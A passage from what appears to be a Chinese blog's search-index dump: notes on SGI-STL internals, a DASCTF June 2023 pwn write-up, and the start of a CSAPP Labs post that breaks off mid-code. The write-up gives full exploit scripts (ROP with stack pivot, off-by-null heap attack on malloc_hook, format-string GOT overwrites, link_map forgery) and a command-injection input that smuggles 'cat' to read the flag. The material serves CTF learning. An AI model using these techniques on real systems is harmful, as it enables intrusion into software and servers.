title="迭代器"></a>迭代器</h4><p>内含四个指针,分别为value_type*类型的cur,first,last分别指向所在缓冲区的当前元素,头部,尾部.另一个map_pointer指向deque的管控中心map(不是STL中的容器map)</p><p>deque的连续线性空间伪造主要依靠的便是迭代器,迭代器在到达一片缓冲区的末尾时跳跃到下一缓冲区或到达开头时跳转到上一个缓冲区,伪造出连续的空间.</p><h4 id="成员变量-3"><a href="#成员变量-3" class="headerlink" title="成员变量"></a>成员变量</h4><p>指向map的指针和map_size.迭代器start,finish分别关联第一个和最后一个缓冲区</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>主要是map的扩容.</p><h3 id="RB-tree"><a href="#RB-tree" class="headerlink" title="RB-tree"></a>RB-tree</h3><p>具有排序的平衡二叉树,用于快速查找.</p><h4 id="迭代器-4"><a href="#迭代器-4" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含一个指向树结点的指针,increment和decrement操作使迭代器指向比当前结点值大的最小元素.(对迭代器而言并没有”大小”的概念,例如increment只是简单的移动到右节点,然后持续移动到左叶子结点.”大小的概念由容器插入节点的树成长过程体现”)</p><h4 id="成员变量-4"><a href="#成员变量-4" class="headerlink" title="成员变量"></a>成员变量</h4><p>一个header指针,一个node_count,一个用于元素比较的仿函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141728705.png"></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>主要学习函数dispatch<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304091803715.png"></p><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>push_heap:新加入的元素放在最后一个结点,循环与父节点比较判断是否交换.<br>pop_heap:将根节点的值与最后一个结点的值交换(交换只是一种说法,实际实现可以不同),让最后一个结点进行下溯交换,直到回到根节点当前位置的前一个.<br>sort_heap:反复进行pop_heap,每次将finish-1即可排序.<br>make_heap:使用pop_heap类似的下溯操作,从最后一个父节点开始依次进行下溯后再使用push_heap操作完成实质的父子结点比较排序过程.</p><p>要注意一点,下溯操作仅是下放某个结点,并不涉及排序.所以《STL源码剖析》一书中侯捷的注释是错误的.按书上更改后,pop_heap调用时若左叶子结点的值小于右叶子节点的值发生错误,make_heap调用时也是错误.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309111124768.png"></p><h2 id="配接器"><a href="#配接器" class="headerlink" title="配接器"></a>配接器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>单端开口先进先出.<br>Stack内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>单端开口先进后出<br>Queue内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>单端开口,出队顺序由排序方式决定.<br>以vector为底层容器进行封装,算法主要由heap算法实现.</p><h3 id="set-map"><a href="#set-map" class="headerlink" title="set map"></a>set map</h3><p>默认均以rb_tree为底层容器,区别是前者键值相同,后者键值类型不一定相同.</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h2 id="思考题1"><a href="#思考题1" class="headerlink" title="思考题1"></a>思考题1</h2><blockquote><p>在写容器的时候 容器里有很多的成员函数或者非成员函数 。有的容器都有对元素的增删操作 ，那么这些操作在如何不恰当使用的情况下，会造成安全问题请构造出poc来 。</p></blockquote><h3 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h3><p>这个其实不能算是容器的增删操作导致的,而是所有类中指针的通病.<br>在没有重载复制(构造)函数情况下,默认的复制(构造)函数会直接复制指针的值(浅拷贝),当其中一个对象销毁时释放掉指针内存而另一个对象还保留着已释放内存的指针.<br>如图,vec和vec2使用同一块内存,若vec被销毁,vec2中仍存有该内存指针造成uaf.<br>(由于STL二级空间置配器并未真正释放内存给操作系统,所以asan并未检测到double free)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162312107.png"><br>改用一级空间置配器检测到double free.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162322079.png"></p><p>重载拷贝构造函数后正常:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141856874.png"></p><h2 id="思考题2"><a href="#思考题2" class="headerlink" title="思考题2"></a>思考题2</h2><blockquote><p>为什么实现了uninitialized_xxx和copy/fill这样两组不同的函数</p></blockquote><ul><li><code>uninitialized_xx</code>函数，其内部会执行结构体的构造函数。该函数面向于<code>尚未进行初始化</code>的内存。</li><li>而没有“<code>uninitialized_</code>”前缀的函数，面向的是<code>已经初始化过</code>的内存。所以不需要再执行构造函数。</li></ul><p>对已包含元素的内存中调用uninitialized_copy,可能导致对象未析构,或者出现问题1同样的情况,如copy,因重载的赋值运算符未被调用而导致浅拷贝的发生.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141803372.png"></p><h2 id="思考题3"><a href="#思考题3" class="headerlink" title="思考题3"></a>思考题3</h2><blockquote><p>理解每个容器的内存模型。</p></blockquote><ul><li>vector的内存模型是一个数组。</li><li>list的内存模型是一个带空结点的双向循环链表.</li><li>deque的内存模型是多个buffer缓冲区和管理buffer的map数组.</li><li>set,map的内存模型是平衡二叉树(红黑树)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> SGI-STL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
            <tag> CPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023六月挑战赛｜二进制专项 复现</title>
      <link href="/2023/DASCTF-2023-June-Binary-WP/"/>
      <url>/2023/DASCTF-2023-June-Binary-WP/</url>
      
        <content type="html"><![CDATA[<p>(<del>距上一次好好看题应该有两个月了吧….</del></p><h2 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>第一次看多线程的题.没开pie和canary.<br>主线程在开启一个子线程后开启沙盒只能使用read,write调用,然后是一个0x10字节的溢出.<br>子线程是一个write的无限循环.</p><span id="more"></span><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主线程禁掉了open,所以无法进行orw.由于子线程是在主线程开启沙箱前创建的,不受沙箱影响.所以最终是要在子线程中执行system.<br>要通过主线程的溢出劫持子线程的控制流,可以通过线程间共享的got表.将write的got表改为主线程中溢出的地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307161610872.png"></p><p>由于新线程的栈是mmap得到的,所以可以利用其与libc的固定偏移得到.在子线程上再进行栈迁移+rop.<br>(感觉这题的各种偏移巧妙得诡异)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line">bss = <span class="number">0x404200</span></span><br><span class="line">rdi = <span class="number">0x401483</span></span><br><span class="line">rsi_r15 = <span class="number">0x401481</span> </span><br><span class="line">ret = <span class="number">0x4013c6</span></span><br><span class="line">leave_ret = <span class="number">0x4013c5</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">'''</span></span><br><span class="line"><span class="string">set scheduler-locking on</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b *0x4013AE</span></span><br><span class="line"><span class="string">thread 2</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#主线程劫持子线程控制流</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b'a'</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(magic_read))</span><br><span class="line"></span><br><span class="line">payload = flat([rsi_r15,e.got[<span class="string">'write'</span>],<span class="number">0</span>,e.plt[<span class="string">'read'</span>],rdi,<span class="number">0x1000</span>,e.plt[<span class="string">'sleep'</span>]])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([bss-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#子线程栈迁移+rop</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = flat([<span class="string">'a'</span>*<span class="number">0x30</span>,rdi,e.got[<span class="string">'puts'</span>],e.plt[<span class="string">'puts'</span>],p64(magic_read)])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">thread_stack = libc_base-<span class="number">0x41f0</span></span><br><span class="line"></span><br><span class="line">rdi_rbp = libc_base+<span class="number">0x2a745</span></span><br><span class="line"></span><br><span class="line">payload = flat([ret,rdi_rbp,binsh_addr,<span class="number">0</span>,system_addr])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([thread_stack-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Noka"><a href="#Noka" class="headerlink" title="Noka"></a>Noka</h2><p>任意地址读写没啥好说的.<br>学到一个trick就是改malloc的got表为一个可控返回值(read_num之类)的函数,再加上之后的read可以达成任意地址写.</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>验证身份,由于snprintf限制了长度0x20,可以将%s后面的.key顶出0x20外截断.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">'admin :'</span>,<span class="string">b'..///////////////////flag'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180900152.png"><br>然后是一个有过滤的命令拼接.<br>命令之间用’\n’截断,过滤了空格用’\t’分隔参数.<br>注意闭合%s前面的单引号.<br>由于长度限制最后flag用通配符.<br>缓冲区未初始化,所以可以多次写入\n.<br>最后命令是这样的: ‘\ncat\tfl*\n.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180911843.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180904864.png"></p><p>由于缓冲区未初始化,也可以在验证函数的栈帧里布置来绕开过滤.</p><h2 id="Approoooooooaching"><a href="#Approoooooooaching" class="headerlink" title="Approoooooooaching"></a>Approoooooooaching</h2><p>Brainfuck的VM(<del>其实到现在对VM的概念都很模糊</del>).<br>洞在执行的时候对v3没有下界检查,可以直接越界修改返回地址,partial overwrite到后门函数.</p><p>(下次一定记得先找后门,还有就是逆向时看个大概就行了,老是想着把每条语句都看懂…)</p><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>2.27的offbynull,没有输出函数,限制free和malloc次数.有一点特殊的是null会写在chunk[size]的地方,也就是只与size有关而与输入长度无关,这也是之后能部分覆写unsortedbin的fd的原因.</p><p>常规流程了,我的布置用完了free的次数所以打malloc_hook</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Index:'</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># offbynull构造堆块重叠,部分覆写unsortedbin</span></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'a'</span>*<span class="number">0x20</span>,<span class="number">0x4c0</span>])</span><br><span class="line">    add(<span class="number">0x28</span>,payload)<span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x2f</span>,<span class="string">b'\x60\x07'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露地址</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(addr).endswith(<span class="string">"7e3"</span>):</span><br><span class="line">            stdout = addr-<span class="number">131</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    io.recvuntil(<span class="string">'1.'</span>)</span><br><span class="line"></span><br><span class="line">    leak_libc(<span class="string">'_IO_2_1_stdout_'</span>,stdout)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x31</span>,malloc_hook_addr-<span class="number">0x8</span>])</span><br><span class="line">    add(<span class="number">0x40</span>,payload)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,p64(libc_base+og[<span class="number">1</span>])+p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># breakrva 0xDA4</span></span><br><span class="line">    <span class="comment"># ''')</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Candy-Shop"><a href="#Candy-Shop" class="headerlink" title="Candy_Shop"></a>Candy_Shop</h2><p>两次参数长度8字节的格式化字符串,一次数组越界bss段之前任意写.<br>先泄露地址,改printf的got表为system,完事.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'g'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">'%31$p'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'gift:'</span>)</span><br><span class="line">leak_libc(<span class="string">'__libc_start_main'</span>,<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'b'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'bye:'</span>,<span class="string">'t'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'in?'</span>,<span class="string">'-10'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">b'\x00'</span>*<span class="number">6</span>+p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'g'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>2.23堆溢出,没啥特别的</p><h2 id="fooooood"><a href="#fooooood" class="headerlink" title="fooooood"></a>fooooood</h2><p>bss段格式化字符串,改返回地址和参数就行了<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307211003955.png"><br>(这题不能改printf的got表因为不能一次性改完,下一次执行printf的时候会崩)</p><h2 id="matchmaking-platform"><a href="#matchmaking-platform" class="headerlink" title="matchmaking platform"></a>matchmaking platform</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞点在sub_12B7函数,该函数向a1指向空间最多读取128字节(向buf读入了129次),进入最后一次循环时,v3==127,++v3溢出到-0x80,即向a1-0x80地址写一个字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292212184.png"><br>程序的主逻辑,配合上该漏洞,可以在times为4,2时修改byte_4140-0x80位置的pptr的低字节,使*pptr的新值为另一个地址,进而在times为3,1的时候在该地址进行写入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292223923.png"><br>于是寻找0x4000-0x4100内的指针,有GOT表和bss段的IO指针.</p><p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p><p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">b'a'</span>*<span class="number">128</span>+<span class="string">b'\x80'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">b'\xb0\x5d'</span>])</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = u64(io.recv(<span class="number">8</span>,<span class="number">0.1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">"0x56"</span>):</span><br><span class="line">        pie_base = addr-<span class="number">0x40a0</span></span><br><span class="line">        log.success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span>+p64(pie_base+<span class="number">0x4140</span>+<span class="number">0x10</span>-<span class="number">0x77</span>)+<span class="string">b'system\x00'</span><span class="comment">#0x77是free字符串在strtab中的偏移</span></span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,payload.ljust(<span class="number">128</span>,<span class="string">b'\x00'</span>)+<span class="string">b'\x08'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([pie_base+<span class="number">0x8</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b'\x00'</span>) + flat([pie_base+<span class="number">0x4140</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x1338)</span></span><br><span class="line">    <span class="comment"># ''')    </span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>(剩余题目之后单独放)</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Labs</title>
      <link href="/2023/CSAPP-Labs/"/>
      <url>/2023/CSAPP-Labs/</url>
      
        <content type="html"><![CDATA[<p>记录CSAPP Lab的一些过程和心得,由于刚开始接触计算机其实完成的质量不高.</p><span id="more"></span><h1 id="Lab1-DataLab"><a href="#Lab1-DataLab" class="headerlink" title="Lab1:DataLab"></a>Lab1:DataLab</h1><p>用位运算实现一些基本操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span 